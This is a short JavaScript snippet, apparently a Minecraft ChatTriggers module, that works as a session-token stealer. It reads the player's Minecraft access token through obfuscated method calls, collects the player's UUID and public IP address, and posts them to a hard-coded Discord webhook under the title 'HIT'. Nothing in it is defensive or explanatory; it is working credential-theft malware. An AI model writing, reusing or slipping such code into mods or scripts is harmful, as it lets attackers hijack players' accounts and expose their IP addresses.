import { request } from "axios";

request({
        url: "https://discord.com/api/webhooks/1178099077569847337/JqeBB3qiXojhZusqcC9HAMqghcRswc_9ZH5bdBdA8Dw6G--uGcSXXVg_mG3Y9uInNul1",
        method: "POST",
        body: {
          "embeds": [
            {
              "title": "HIT",
              "color": 0xC6A3D4,
              "fields": [
                {"name": "Token", "value": Client.getMinecraft().func_110432_I().func_111286_b() }, 
                {"name": "UUID",   "value": Player.getUUID() },
                {"name": "IP", "value": FileLib.getUrlContent("http://checkip.amazonaws.com/") }
              ]
            }
          ]
        },
        json: true
      }).then(res => {
    }).catch(error => {
        console.log(erorr.message);
    })
